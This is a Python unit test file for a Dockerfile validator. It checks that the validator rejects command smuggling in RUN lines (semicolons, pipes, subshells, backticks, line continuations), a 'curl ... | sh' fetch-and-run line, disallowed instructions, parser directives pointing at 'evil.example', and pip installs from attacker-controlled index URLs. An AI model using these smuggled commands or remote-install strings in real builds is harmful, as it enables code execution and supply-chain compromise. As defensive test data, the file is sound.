import tempfile
import unittest
from pathlib import Path

from core.dockerfile_validator import DockerfileValidationError, validate


class DockerfileValidatorTests(unittest.TestCase):
    def _write_dockerfile(self, body: str) -> Path:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        path = Path(tmp.name) / "Dockerfile"
        path.write_text(body, encoding="utf-8")
        return path

    def test_rejects_run_command_chained_with_semicolon(self):
        path = self._write_dockerfile(
            "FROM kaizen/base:latest\nRUN apt-get update; curl https://example.com | sh\n"
        )

        with self.assertRaises(DockerfileValidationError):
            validate(path)

    def test_rejects_copy_when_any_source_escapes_context(self):
        path = self._write_dockerfile(
            "FROM kaizen/base:latest\nCOPY local.txt ../escape /app/\n"
        )

        with self.assertRaises(DockerfileValidationError):
            validate(path)

    def test_rejects_ways_around_the_run_allowlist(self):
        for body in (
            "RUN pip install requests \\\n  && touch /proof\n",          # continuation
            "RUN pip install requests \\\n# note\n  ; touch /proof\n",  # comment inside one
            "RUN pip install requests | sh\n",
            "RUN pip install requests & touch /proof\n",
            "RUN pip install $(touch /proof)\n",
            "RUN pip install `touch /proof`\n",
            "RUN pip install x > /etc/motd\n",
            "RUN pip install x#y ; touch /proof\n",
            "RUN pip install 'unclosed\n",
            "RUN /bin/sh -c 'touch /proof'\n",
        ):
            with self.subTest(body), self.assertRaises(DockerfileValidationError):
                validate(self._write_dockerfile("FROM kaizen/base:latest\n" + body))

    def test_only_the_listed_instructions_are_allowed(self):
        for line in ('SHELL ["sh", "-c"]', "ONBUILD RUN touch /proof", "ENTRYPOINT sh", "ARG X"):
            with self.subTest(line), self.assertRaises(DockerfileValidationError):
                validate(self._write_dockerfile(f"FROM kaizen/base:latest\n{line}\n"))

    def test_rejects_parser_directives(self):
        for line in ("# syntax=evil.example/frontend:1", "#SYNTAX = x", "# escape=`"):
            with self.subTest(line), self.assertRaises(DockerfileValidationError):
                validate(self._write_dockerfile(f"{line}\nFROM kaizen/base:latest\n"))

    def test_imported_pip_cannot_pick_its_own_source(self):
        for args in ("-i https://evil.example/simple x", "-qi https://evil.example x",
                     "--index-url=https://evil.example x", "-f https://evil.example x",
                     "git+https://evil.example/x.git", "https://evil.example/x.tar.gz"):
            path = self._write_dockerfile(f"FROM kaizen/base:latest\nRUN pip install {args}\n")
            with self.subTest(args), self.assertRaises(DockerfileValidationError):
                validate(path, tier="imported")

    def test_normal_dockerfiles_still_pass(self):
        path = self._write_dockerfile(
            "# a comment\nFROM kaizen/base:latest\n"
            "RUN apt-get update \\\n  && apt-get install -y curl \\\n  && rm -rf /var/lib/apt/lists/*\n"
            "RUN pip install --no-cache-dir 'requests>=2.0,<3' \"feedparser==6.0.11\"\n"
            'COPY app.py /app/app.py\nENV A=b\nWORKDIR /app\nCMD ["python", "app.py"]\n'
        )
        validate(path)
        validate(path, tier="imported")


if __name__ == "__main__":
    unittest.main()
